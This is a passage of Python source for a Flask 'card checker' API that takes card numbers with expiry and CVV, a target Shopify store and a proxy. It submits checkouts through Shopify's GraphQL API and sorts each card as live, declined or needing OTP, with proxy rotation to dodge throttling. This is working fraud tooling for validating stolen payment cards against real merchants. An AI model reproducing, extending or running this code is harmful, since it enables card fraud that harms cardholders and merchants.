                    if receipt.get('__typename') == 'ProcessedReceipt':
                        return True, "ORDER_PLACED", gateway, total_price, currency
                    rid = receipt.get('id')
                if not rid:
                    return False, "Success but no receipt ID", gateway, total_price, currency

            elif result_type == 'SubmitFailed':
                reason = submit_data.get('reason', 'Unknown')
                return False, extract_clean_response(str(reason)), gateway, total_price, currency

            elif result_type == 'SubmitRejected':
                errors = submit_data.get('errors') or []
                if errors and isinstance(errors[0], dict):
                    err0 = errors[0]
                    code = err0.get('code', '')
                    localized = err0.get('localizedMessage', '')
                    nonloc = err0.get('nonLocalizedMessage', '')
                    detail = localized or nonloc
                    if detail and code in ('GENERIC_ERROR', 'PAYMENT_FAILED', ''):
                        return False, detail, gateway, total_price, currency
                    if code:
                        return False, code, gateway, total_price, currency
                return False, "Submit Rejected", gateway, total_price, currency

            elif result_type == 'Throttled':
                return False, "Throttled (submit)", gateway, total_price, currency

            else:
                receipt = submit_data.get('receipt')
                if isinstance(receipt, dict):
                    rid = receipt.get('id')
                if not rid:
                    return False, f"Unknown submit result: {result_type}", gateway, total_price, currency

            poll_params = {'operationName': 'PollForReceipt'}
            poll_json = {'query': QUERY_POLL,
                         'variables': {'receiptId': rid, 'sessionToken': sst},
                         'operationName': 'PollForReceipt'}

            await asyncio.sleep(3)
            final_text = ''

            for i in range(5):
                _, final_text = await make_graphql_request(
                    session, graphql_url, poll_params, headers, poll_json, proxy)

                if is_captcha_required(final_text):
                    return True, "CARD_DECLINED", gateway, total_price, currency

                try:
                    poll_json_resp = json.loads(final_text)
                    receipt = safe_get(poll_json_resp, 'data', 'receipt', default={})
                    if isinstance(receipt, dict) and receipt:
                        tname = receipt.get('__typename', '')
                        if tname == 'ProcessedReceipt':
                            return True, "ORDER_PLACED", gateway, total_price, currency
                        elif tname == 'FailedReceipt':
                            err = receipt.get('processingError', {})
                            if isinstance(err, dict) and err.get('__typename') == 'PaymentFailed':
                                code = err.get('code', '')
                                msg = err.get('messageUntranslated', '')
                                if code in ('GENERIC_ERROR', 'PAYMENT_FAILED', '') and msg:
                                    return True, msg, gateway, total_price, currency
                                return True, code or 'PAYMENT_FAILED', gateway, total_price, currency
                            code = (err.get('code') if isinstance(err, dict) else None) or 'UNKNOWN_ERROR'
                            return True, code, gateway, total_price, currency
                        elif tname == 'ActionRequiredReceipt':
                            return True, "OTP_REQUIRED", gateway, total_price, currency
                        elif tname in ('ProcessingReceipt', 'WaitingReceipt'):
                            await asyncio.sleep(4)
                            continue
                except Exception:
                    pass

                if 'WaitingReceipt' in final_text:
                    await asyncio.sleep(4)
                else:
                    break

            if 'CAPTCHA_REQUIRED' in final_text:
                return True, "CARD_DECLINED", gateway, total_price, currency
            if 'WaitingReceipt' in final_text:
                return False, "Change Proxy or Site", gateway, total_price, currency

            try:
                res_json = json.loads(final_text)
                result_code = safe_get(res_json, 'data', 'receipt', 'processingError', 'code')
                if "shopify_payments" in str(res_json):
                    return True, "ORDER_PLACED", gateway, total_price, currency
                if result_code:
                    return True, result_code, gateway, total_price, currency
                return True, "MISMATCHED_BILL", gateway, total_price, currency
            except Exception:
                pass

            code = extract_between(final_text, '{"code":"', '"')
            low = final_text.lower()
            if 'actionreq' in low or 'action_required' in low:
                return True, "OTP_REQUIRED", gateway, total_price, currency
            elif 'processedreceipt' in low:
                return True, "ORDER_PLACED", gateway, total_price, currency
            elif 'failedreceipt' in low or 'declined' in low:
                return True, code or "CARD_DECLINED", gateway, total_price, currency
            return False, "Unknown Result", gateway, total_price, currency

    except Exception as e:
        logger.error(traceback.format_exc())
        return False, f"Error Processing Card: {str(e)[:150]}", gateway, total_price, currency


def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(),
            'ano': parts[2].strip(), 'cvv': parts[3].strip()}


# ==================== FLASK API ====================

app = Flask(__name__)


@app.route('/shopify', methods=['GET'])
def shopify_checker():
    try:
        site = request.args.get('site')
        cc_string = request.args.get('cc')
        proxy_str = request.args.get('proxy')

        if not site:
            return jsonify({"error": "Missing 'site' parameter", "status": False}), 400
        if not cc_string:
            return jsonify({"error": "Missing 'cc' parameter (CC|MM|YYYY|CVV)", "status": False}), 400

        try:
            parts = parse_cc_string(cc_string)
        except ValueError as e:
            return jsonify({"error": str(e), "status": False}), 400

        variant_id = request.args.get('variant')

        success, message, gateway, price, currency = asyncio.run(
            process_card(parts['cc'], parts['mes'], parts['ano'], parts['cvv'],
                         site, variant_id, proxy_str))

        clean = extract_clean_response(message)
        try:
            price_val = float(price)
        except (ValueError, TypeError):
            price_val = 0.0

        return jsonify({
            "Gateway": gateway,
            "Price": price_val,
            "Response": clean,
            "Status": success,
            "cc": cc_string
        })

    except Exception as e:
        logger.error(traceback.format_exc())
        return jsonify({
            "error": str(e)[:200],
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": f"ERROR: {str(e)[:200]}",
            "cc": request.args.get('cc', '')
        }), 500


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
